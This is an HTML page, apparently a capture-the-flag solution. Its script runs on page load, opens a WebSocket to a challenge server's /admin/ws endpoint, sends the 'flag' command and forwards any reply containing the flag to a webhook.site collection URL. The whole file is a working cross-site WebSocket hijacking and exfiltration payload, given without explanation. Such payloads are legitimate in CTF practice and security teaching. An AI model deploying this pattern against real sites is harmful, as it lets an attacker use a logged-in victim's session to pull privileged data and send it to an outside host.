<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket Exploit to Retrieve Flag</title>
</head>
<body>
    <h1>WebSocket Exploit - Automatically Retrieve Flag</h1>

    <script>
        // Create a new WebSocket connection to /admin/ws
        const socket = new WebSocket('ws://ce441-web.spchallenge.ir:8080/admin/ws');

        // Event handler for when the WebSocket is open
        socket.onopen = function() {
            console.log('WebSocket connected');
            
            // Automatically send the 'flag' command to retrieve the flag
            socket.send('flag');
            console.log('Sent command: flag');
        };

        // Event handler for receiving messages from the WebSocket
        socket.onmessage = function(event) {
            console.log('Message from server: ', event.data);
            
            // Check if the server sent the flag
            if (event.data.includes('flag')) {
                // Forward the flag to the webhook
                sendToWebhook(event.data);
            }
        };

        // Function to send the flag to the webhook
        function sendToWebhook(flagData) {
            fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flag', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    flag: flagData
                })
            })
            .then(response => response.json())
            .then(json => console.log('Flag sent to webhook:', json))
            .catch(error => console.error('Error sending flag to webhook:', error));
        }

        // Event handler for WebSocket errors
        socket.onerror = function(error) {
            console.error('WebSocket Error:', error);
        };

        // Event handler for WebSocket closure
        socket.onclose = function() {
            console.log('WebSocket closed');
        };
    </script>
</body>
</html>
